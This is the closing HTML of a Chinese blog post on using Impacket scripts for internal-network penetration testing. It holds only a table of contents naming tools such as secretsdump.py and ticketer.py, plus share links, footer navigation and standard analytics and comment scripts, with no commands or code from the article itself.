class="toc-number">3.3.4.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetNPUsers-py"><span class="toc-number">3.3.5.</span> <span class="toc-text">GetNPUsers.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-10"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-8"><span class="toc-number">3.3.5.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rbcd-py"><span class="toc-number">3.3.6.</span> <span class="toc-text">rbcd.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-11"><span class="toc-number">3.3.6.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-9"><span class="toc-number">3.3.6.2.</span> <span class="toc-text">常用选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.3.6.3.</span> <span class="toc-text">利用实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0MAQ%E6%97%B6%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.6.4.</span> <span class="toc-text">无MAQ时的新利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ticketConverter-py"><span class="toc-number">3.3.7.</span> <span class="toc-text">ticketConverter.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-12"><span class="toc-number">3.3.7.1.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ticketer-py"><span class="toc-number">3.3.8.</span> <span class="toc-text">ticketer.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-13"><span class="toc-number">3.3.8.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-10"><span class="toc-number">3.3.8.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#raiseChild-py-%E6%97%A0%E7%8E%AF%E5%A2%83"><span class="toc-number">3.3.9.</span> <span class="toc-text">raiseChild.py(无环境)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-14"><span class="toc-number">3.3.9.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-11"><span class="toc-number">3.3.9.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">Windows密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secretsdump-py"><span class="toc-number">3.4.1.</span> <span class="toc-text">secretsdump.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-15"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-12"><span class="toc-number">3.4.1.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-py"><span class="toc-number">3.4.2.</span> <span class="toc-text">mimikatz.py</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&text=Impacket脚本使用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&is_video=false&description=Impacket脚本使用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Impacket脚本使用&body=Check out this article: https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&name=Impacket脚本使用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&t=Impacket脚本使用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
